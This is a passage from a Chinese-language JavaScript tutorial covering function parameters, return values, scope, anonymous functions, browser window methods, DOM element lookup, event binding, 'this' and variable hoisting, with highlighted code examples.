class="hljs-string">&quot;hello&quot;</span>)<br><br>&#125;<br><span class="hljs-title function_">f</span>() <span class="hljs-comment">//-----&gt;OK</span><br></code></pre></td></tr></table></figure><blockquote><p>不同于python，js代码在运行时，会分为两大部分———检查装载 和 执行阶段。</p><ul><li>检查装载阶段：会先检测代码的语法错误，进行变量、函数的声明</li><li>执行阶段：变量的赋值、函数的调用等，都属于执行阶段。</li></ul></blockquote><p><a name="48087788"></a></p><h3 id="4-11-3、函数参数"><a href="#4-11-3、函数参数" class="headerlink" title="4.11.3、函数参数"></a>4.11.3、函数参数</h3><p>（1） 参数基本使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 位置参数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>)&#123;<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);<br>&#125;<br><span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment">// 默认参数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">stu_info</span>(<span class="hljs-params">name,gender=<span class="hljs-string">&quot;male&quot;</span></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;姓名：&quot;</span>+name+<span class="hljs-string">&quot; 性别：&quot;</span>+gender)<br>&#125;<br><br><span class="hljs-title function_">stu_info</span>(<span class="hljs-string">&quot;yuan&quot;</span>)<br></code></pre></td></tr></table></figure><p><a name="303471d7"></a></p><h3 id="4-11-4、函数返回值"><a href="#4-11-4、函数返回值" class="headerlink" title="4.11.4、函数返回值"></a>4.11.4、函数返回值</h3><p>在函数体内，使用 return 语句可以设置函数的返回值。一旦执行 return 语句，将停止函数的运行，并运算和返回 return 后面的表达式的值。如果函数不包含 return 语句，则执行完函数体内每条语句后，返回 undefined 值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x,y</span>) &#123;<br>          <span class="hljs-keyword">return</span> x,y<br>      &#125;<br><br><span class="hljs-keyword">var</span> ret = <span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret)<br></code></pre></td></tr></table></figure><blockquote><p>1、在函数体内可以包含多条 return 语句，但是仅能执行一条 return 语句</p><p>2、函数的参数没有限制，但是返回值只能是一个；如果要输出多个值，可以通过数组或对象进行设计。</p></blockquote><p><a name="b8146099"></a></p><h3 id="4-11-5、函数作用域"><a href="#4-11-5、函数作用域" class="headerlink" title="4.11.5、函数作用域"></a>4.11.5、函数作用域</h3><p>作用域是JavaScript最重要的概念之一。</p><p>JavaScript中，变量的作用域有全局作用域和局部作用域两种。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 局部变量,是在函数内部声明,它的生命周期在当前函数被调用的时候, 当函数调用完毕以后,则内存中自动销毁当前变量</span><br><span class="hljs-comment">// 全局变量,是在函数外部声明,它的生命周期在当前文件中被声明以后就保存在内存中,直到当前文件执行完毕以后,才会被内存销毁掉</span><br></code></pre></td></tr></table></figure><p>首先熟悉下var</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;yuan&quot;</span>; <span class="hljs-comment">// 声明一个全局变量 name并赋值”yuan“</span><br>name = <span class="hljs-string">&quot;张三&quot;</span>;  <span class="hljs-comment">// 对已经存在的变量name重新赋值 ”张三“</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);<br><br><span class="hljs-keyword">var</span>  gender = <span class="hljs-string">&quot;male&quot;</span><br><span class="hljs-keyword">var</span>  gender = <span class="hljs-string">&quot;female&quot;</span> <span class="hljs-comment">// 原内存释放与新内存开辟，指针指向新开辟的内存</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gender)<br></code></pre></td></tr></table></figure><p>作用域案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">var</span> num = <span class="hljs-number">10</span>; <span class="hljs-comment">// 在函数外部声明的变量, 全局变量</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">func</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-comment">//千万不要再函数内部存在和全局变量同名的变量</span><br>  num = <span class="hljs-number">20</span>; <span class="hljs-comment">// 函数内部直接使用变量,则默认调用了全局的变量,</span><br>&#125;<br><span class="hljs-title function_">func</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;全局num：&quot;</span>,num);<br></code></pre></td></tr></table></figure><p><a name="c4019b6d"></a></p><h3 id="4-11-6、匿名函数"><a href="#4-11-6、匿名函数" class="headerlink" title="4.11.6、匿名函数"></a>4.11.6、匿名函数</h3><p>匿名函数，即没有变量名的函数。在实际开发中使用的频率非常高！也是学好JS的重点。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">   <span class="hljs-comment">// 匿名函数赋值变量</span><br>    <span class="hljs-keyword">var</span> foo = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;这是一个匿名函数！&quot;</span>)<br>    &#125;;<br><span class="hljs-title function_">foo</span>() <span class="hljs-comment">//调用匿名函数</span><br><br><br>   <span class="hljs-comment">// 匿名函数的自执行</span><br>   (<span class="hljs-keyword">function</span> (<span class="hljs-params">x,y</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x+y);<br>    &#125;)(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><br><br>  <span class="hljs-comment">// 匿名函数作为一个高阶函数使用</span><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;inner函数！&quot;</span>)<br>     &#125;<br> &#125;<br> <span class="hljs-title function_">bar</span>()()<br></code></pre></td></tr></table></figure><p><a name="10cb42ff"></a></p><h2 id="4-12、BOM对象（了解）"><a href="#4-12、BOM对象（了解）" class="headerlink" title="4.12、BOM对象（了解）"></a>4.12、BOM对象（了解）</h2><p>BOM:Broswer object model,即浏览器提供我们开发者在javascript用于操作浏览器的对象。</p><p><a name="99fdca74"></a></p><h3 id="4-12-1、window对象"><a href="#4-12-1、window对象" class="headerlink" title="4.12.1、window对象"></a>4.12.1、window对象</h3><ul><li>窗口方法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// BOM  Browser object model 浏览器对象模型</span><br><br><span class="hljs-comment">// window是js中最大的一个对象.整个浏览器窗口出现的所有东西都是window对象的内容.</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-variable language_">window</span> );<br><br><span class="hljs-comment">// alert()  弹出一个警告框</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br><br><span class="hljs-comment">//confirm  弹出一个确认框,点击确认,返回true, 点击取消,返回false</span><br><span class="hljs-keyword">var</span> ret = <span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;您确认要删除当前文件么?&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( ret  );<br><br><span class="hljs-comment">// 弹出一个消息输入框,当点击确认以后,则返回可以接收到用户在输入框填写的内容.如果点击取消,则返回null</span><br><span class="hljs-keyword">var</span> ret = <span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;请输入一个内容&quot;</span>,<span class="hljs-string">&quot;默认值&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( ret );<br><br><span class="hljs-comment">// close() 关闭当前浏览器窗口</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">close</span>();<br><br><span class="hljs-comment">//打开一个新的浏览器窗口</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>,<span class="hljs-string">&quot;_blank&quot;</span>,<span class="hljs-string">&quot;width=800px,height=500px,left=200px,top=200px&quot;</span>);<br></code></pre></td></tr></table></figure><p><a name="b28eff7f"></a></p><h2 id="4-13、DOM对象-了解"><a href="#4-13、DOM对象-了解" class="headerlink" title="4.13、DOM对象(了解)"></a>4.13、DOM对象(了解)</h2><p>DOM  document Object Model 文档对象模型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 整个html文档,会保存一个文档对象document</span><br><span class="hljs-comment">// console.log( document ); // 获取当前文档的对象</span><br></code></pre></td></tr></table></figure><p><a name="40e8e515"></a></p><h3 id="4-13-1、查找标签"><a href="#4-13-1、查找标签" class="headerlink" title="4.13.1、查找标签"></a>4.13.1、查找标签</h3><ul><li>直接查找标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;标签名&quot;</span>)<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;id值&quot;</span>)<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&quot;类名&quot;</span>)<br><span class="hljs-comment">//返回dom对象，就是标签对象或者数组</span><br></code></pre></td></tr></table></figure><ul><li>CSS选择器查找</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;css选择器&quot;</span>)  <span class="hljs-comment">//根据css选择符来获取查找到的第一个元素，返回标签对象（dom对象）</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;css选择器&quot;</span>); <span class="hljs-comment">// 根据css选择符来获取查找到的所有元素,返回数组</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;i1&quot;</span>&gt;</span>DIV1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1&quot;</span>&gt;</span>DIV<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1&quot;</span>&gt;</span>DIV<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1&quot;</span>&gt;</span>DIV<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;outer&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1&quot;</span>&gt;</span>item<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c2&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c4&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c5&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;i2&quot;</span>&gt;</span>111<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>222<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>333<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">   <span class="hljs-comment">// 直接查找</span></span><br><span class="language-javascript">   <span class="hljs-keyword">var</span> ele = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;i1&quot;</span>);  <span class="hljs-comment">// ele就是一个dom对象</span></span><br><span class="language-javascript">   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ele);</span><br><span class="language-javascript"></span><br><span class="language-javascript">   <span class="hljs-keyword">var</span> eles = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&quot;c1&quot;</span>); <span class="hljs-comment">// eles是一个数组 [dom1,dom2,...]</span></span><br><span class="language-javascript">   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(eles);</span><br><span class="language-javascript"></span><br><span class="language-javascript">   <span class="hljs-keyword">var</span> eles2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;div&quot;</span>); <span class="hljs-comment">// eles2是一个数组 [dom1,dom2,...]</span></span><br><span class="language-javascript">   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(eles2);</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//定位outer下的c1对应的标签</span></span><br><span class="language-javascript">   <span class="hljs-keyword">var</span> outer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&quot;outer&quot;</span>)[<span class="hljs-number">0</span>];</span><br><span class="language-javascript">   <span class="hljs-keyword">var</span> te = outer.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&quot;c1&quot;</span>);</span><br><span class="language-javascript">   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(te);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// css选择器</span></span><br><span class="language-javascript"><span class="hljs-comment">//层级定位(空格可以表示一个或多个层级)</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> dom = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.c2 .c3 .c5&quot;</span>);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;:::&quot;</span>,dom);</span><br><span class="language-javascript"><span class="hljs-comment">//层级定位</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> doms = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;ul li&quot;</span>);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;:::&quot;</span>,doms);</span><br><span class="language-javascript">    </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="3a0dd6a6"></a></p><h3 id="4-13-2、绑定事件"><a href="#4-13-2、绑定事件" class="headerlink" title="4.13.2、绑定事件"></a>4.13.2、绑定事件</h3><ul><li>静态绑定 ：直接把事件写在标签元素中</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;foo()&quot;</span>&gt;</span>click<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;           </span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;foo函数&quot;</span>);   </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>动态绑定：在js中通过代码获取元素对象,然后给这个对象进行后续绑定</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;i1&quot;</span>&gt;</span>试一试!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> ele=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;i1&quot;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    ele.<span class="hljs-property">onclick</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ok&quot;</span>);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>一个元素本身可以绑定多个不同的事件, 但是如果多次绑定同一个事件,则后面的事件代码会覆盖前面的事件代码</p></blockquote><ul><li><h2 id="在-JavaScript-中-this-不是固定不变的，它会随着执行环境的改变而改变。-单独使用-this，则它指向全局-Global-对象。在浏览器中，window-就是该全局对象为-object-Window"><a href="#在-JavaScript-中-this-不是固定不变的，它会随着执行环境的改变而改变。-单独使用-this，则它指向全局-Global-对象。在浏览器中，window-就是该全局对象为-object-Window" class="headerlink" title="在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。 -  单独使用 this，则它指向全局(Global)对象。在浏览器中，window 就是该全局对象为 [object Window]: "></a>在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。<br> -  单独使用 this，则它指向全局(Global)对象。在浏览器中，window 就是该全局对象为 [<strong>object Window</strong>]: </h2></li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">var</span> x = <span class="hljs-keyword">this</span>;<br></code></pre></td></tr></table></figure><ul><li>在函数中，函数的所属者&#x2F;调用者默认绑定到 this 上。 </li><li></li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>() &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-type">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>对象方法中的this就是对象本身 </li><li></li></ul><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> person = &#123;<br>  <span class="hljs-attribute">firstName</span>  : <span class="hljs-string">&quot;John&quot;</span>,<br>  <span class="hljs-attribute">lastName</span>   : <span class="hljs-string">&quot;Doe&quot;</span>,<br>  <span class="hljs-attribute">id         :</span><span class="hljs-string"> 5566,</span><br><span class="hljs-string">  myFunction</span> : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>事件中的this就是接收事件的 HTML 标签 </li><li></li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> <span class="hljs-keyword">onclick</span>=<span class="hljs-string">&quot;this.style.display=&#x27;none&#x27;&quot;</span>&gt;<br>点我后我就消失了<br>&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure><p><a name="33a0e94c"></a></p><h2 id="4-14-进阶操作（重点）"><a href="#4-14-进阶操作（重点）" class="headerlink" title="4.14 进阶操作（重点）"></a>4.14 进阶操作（重点）</h2><ul><li>ES6新特性 <ul><li>ES6是JavaScript语言的下一代标准，已经在2015年6月正式发布了。Mozilla公司将在这个标准的基础上，推出JavaScript 2.0。</li></ul></li><li><h2 id="变量提升-查看以下代码-是否可以被运行"><a href="#变量提升-查看以下代码-是否可以被运行" class="headerlink" title="变量提升 -  查看以下代码, 是否可以被运行 "></a>变量提升<br> -  查看以下代码, 是否可以被运行 </h2></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);<br>    <span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;大马猴&#x27;</span>;<br>&#125;<br><span class="hljs-title function_">fn</span>()<br></code></pre></td></tr></table></figure><ul><li>发现问题了么. 这么写代码, 在其他语言里. 绝对是不允许的. 但是在js里. 不但允许, 还能执行. 为什么呢?  因为在js执行的时候. 它会首先检测你的代码.  发现在代码中会有name使用. OK. 运行时就会变成这样的逻辑: </li><li></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> name;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);<br>    name = <span class="hljs-string">&#x27;大马猴&#x27;</span>;<br>&#125;<br><span class="hljs-title function_">fn</span>();<br></code></pre></td></tr></table></figure><ul><li>看到了么. 实际运行的时候和我们写代码的顺序可能会不一样….这种把变量提前到代码块第一部分运行的逻辑被称为<strong>变量提升</strong>. 这在其他语言里是绝对没有的. 并且也不是什么好事情. 正常的逻辑不应该是这样的. 那么怎么办?  在新的ES6中. 就明确了, 这样使用变量是不完善的. es6提出. 用let来声明变量. 就不会出现该问题了. </li><li></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 